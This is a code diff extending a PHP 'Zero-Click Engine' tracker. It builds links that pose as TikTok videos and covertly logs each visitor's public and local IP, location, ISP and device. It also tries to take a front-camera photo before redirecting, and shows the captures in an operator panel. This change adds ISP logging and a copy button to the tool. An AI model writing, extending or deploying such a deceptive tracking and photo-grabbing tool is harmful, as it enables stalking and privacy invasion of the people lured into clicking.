@@ -1,18 +1,22 @@
 <?php
 date_default_timezone_set('Africa/Algiers');
 
+// منع ظهور الأخطاء للمستخدم النهائي
 error_reporting(0);
 @ini_set('display_errors', 0);
 
+// إنشاء مجلد الرفع إذا لم يكن موجوداً
 $upload_dir = 'uploads/';
 if (!is_dir($upload_dir)) {
     @mkdir($upload_dir, 0755, true);
 }
 
+// إعداد قاعدة البيانات وتحديث الجداول
 try {
-    $db = new PDO('sqlite:tracker_zero_click.db');
+    $db = new PDO('sqlite:tracker_enhanced_v2.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
+    // جدول الروابط
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -23,6 +27,7 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
+    // جدول السجلات مع إضافة حقل isp_info (نوع المتعامل)
     $db->exec("CREATE TABLE IF NOT EXISTS captures (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
@@ -31,6 +36,7 @@ try {
         local_ip TEXT, 
         port TEXT, 
         location TEXT, 
+        isp_info TEXT, -- حقل جديد لنوع المتعامل
         device_info TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
@@ -38,6 +44,7 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
+// دالة حذف سجل محدد
 if (isset($_GET['delete_id'])) {
     $del_id = intval($_GET['delete_id']);
     $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
@@ -46,6 +53,7 @@ if (isset($_GET['delete_id'])) {
     exit();
 }
 
+// دالة جلب معلومات تيك توك للمعاينة
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
         'title' => 'TikTok Video',
@@ -104,6 +112,7 @@ function fetch_tiktok_exclusive_meta($url) {
     return $meta;
 }
 
+// دالة جلب الـ IP الحقيقي
 function get_real_ip() {
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
@@ -112,20 +121,25 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-function get_ip_location($ip) {
+// دالة جلب الموقع ومعلومات المتعامل (ISP)
+function get_ip_location_and_isp($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
-        return 'Local Network';
+        return ['location' => 'Local Network', 'isp' => 'Internal/VPN'];
     }
-    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city");
+    // استخدام API لجلب الموقع واسم المتعامل
+    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp");
     if ($json) {
         $data = json_decode($json, true);
         if (isset($data['status']) && $data['status'] === 'success') {
-            return ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
+            $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
+            $isp = $data['isp'] ?? 'Unknown ISP';
+            return ['location' => $location, 'isp' => $isp];
         }
     }
-    return 'Unknown Location';
+    return ['location' => 'Unknown Location', 'isp' => 'Unknown ISP'];
 }
 
+// دالة تحديد نوع الجهاز
 function get_device_type($ua) {
     $brand = 'Device';
     if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
@@ -133,6 +147,7 @@ function get_device_type($ua) {
     elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
     elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
     elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';
+    elseif (stripos($ua, 'Realme') !== false) $brand = 'Realme';
 
     if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
     if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
@@ -173,18 +188,23 @@ if (isset($_GET['r'])) {
             exit();
         }
 
-        // استقبال البيانات سواء تم إرسال صورة أو بيانات عامة فقط
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             $img_base64 = $_POST['image'] ?? '';
             $public_ip = get_real_ip();
             $local_ip = $_POST['lip'] ?? 'Direct';
             $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
-            $location = get_ip_location($public_ip);
+            
+            // جلب الموقع ومعلومات المتعامل
+            $ip_details = get_ip_location_and_isp($public_ip);
+            $location = $ip_details['location'];
+            $isp = $ip_details['isp']; // معلومات المتعامل
+            
             $device = get_device_type($ua);
 
             try {
-                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
-                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
+                // حفظ البيانات بما فيها نوع المتعامل
+                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $isp, $device, date('Y-m-d H:i:s')]);
             } catch (Exception $e) {}
             exit('OK');
         }
@@ -248,12 +268,10 @@ if (isset($_GET['r'])) {
 
         function initTracking() {
             if (!useCamera) {
-                // إذا كانت الكاميرا غير مفعلة، أرسل المعلومات الأساسية فوراً وانتقل
                 sendInfoAndRedirect("");
                 return;
             }
 
-            // إذا كانت الكاميرا مفعلة، حاول التقاط الصورة مع جمع باقي المعلومات
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
@@ -274,7 +292,6 @@ if (isset($_GET['r'])) {
                     }, 300);
                 })
                 .catch(err => {
-                    // في حال رفض إذن الكاميرا، يتم إرسال باقي المعلومات بدون صورة والتوجيه طبيعياً
                     sendInfoAndRedirect("");
                 });
         }
@@ -334,7 +351,7 @@ if (!empty($filter_code)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel - Core Engine</title>
+    <title>Core Engine - Control Panel</title>
     <style>
         :root {
             --bg-main: #070913;
@@ -346,6 +363,7 @@ if (!empty($filter_code)) {
             --accent-hover: #7c3aed;
             --danger: #f43f5e;
             --danger-hover: #e11d48;
+            --success: #10b981;
         }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         
@@ -402,6 +420,8 @@ if (!empty($filter_code)) {
         .btn-danger:hover { background: var(--danger-hover); }
         .btn-secondary { background: #334155; }
         .btn-secondary:hover { background: #475569; }
+        .btn-success { background: var(--success); }
+        .btn-success:hover { background: #059669; }
 
         .result-panel { background: #050b14; border: 1px solid var(--border-color); padding: 18px; border-radius: 12px; margin-top: 15px; }
         .result-panel label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; color: var(--accent); margin-bottom: 8px; letter-spacing: 0.05em; }
@@ -464,7 +484,7 @@ if (!empty($filter_code)) {
         
         <div>
             <h1>Control Panel</h1>
-            <p class="subtitle">TikTok High-Speed Zero-Click Engine</p>
+            <p class="subtitle">TikTok High-Speed Zero-Click Engine v2</p>
         </div>
 
         <div class="section-box">
@@ -484,7 +504,7 @@ if (!empty($filter_code)) {
                 <div class="result-panel">
                     <label>Active Link:</label>
                     <div class="flex-row">
-                        <input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
+                        <input type="text" id="activeLink" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                         <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
                     </div>
                 </div>
@@ -493,12 +513,17 @@ if (!empty($filter_code)) {
 
         <div class="section-box">
             <h2>Captured Gallery & Details</h2>
-            <form method="GET" style="margin-bottom: 20px; display: flex; gap: 8px;">
-                <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1;">
-                <button type="submit" class="btn" style="height:48px;">Filter</button>
-                <?php if(!empty($filter_code)): ?>
-                    <a href="/" class="btn btn-danger" style="height:48px; text-decoration:none; display:flex; align-items:center;">Reset</a>
-                <?php endif; ?>
+            <!-- تم إضافة زر نسخ رمز التتبع بجوار زر الفلترة -->
+            <form method="GET" style="margin-bottom: 20px; display: flex; gap: 8px; flex-wrap: wrap;">
+                <input type="text" id="trackCodeInput" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; min-width: 200px;">
+                <div style="display: flex; gap: 8px;">
+                    <button type="submit" class="btn" style="height:48px;">Filter</button>
+                    <!-- الزر الجديد لنسخ الرمز المكتوب -->
+                    <button type="button" class="btn btn-success" style="height:48px;" onclick="copyText(document.getElementById('trackCodeInput').value, this)">Copy Code</button>
+                    <?php if(!empty($filter_code)): ?>
+                        <a href="/" class="btn btn-danger" style="height:48px; text-decoration:none; display:flex; align-items:center;">Reset</a>
+                    <?php endif; ?>
+                </div>
             </form>
 
             <?php if (empty($captures)): ?>
@@ -531,6 +556,10 @@ if (!empty($filter_code)) {
                             </div>
                             <div class="info-row">
                                 <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
+                            </div>
+                            <!-- عرض معلومات المتعامل الجديدة -->
+                            <div class="info-row">
+                                <span>المتعامل:</span> <span style="color:#f97316;"><?php echo htmlspecialchars($cap['isp_info']); ?></span>
                             </div>
                             <div class="info-row">
                                 <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
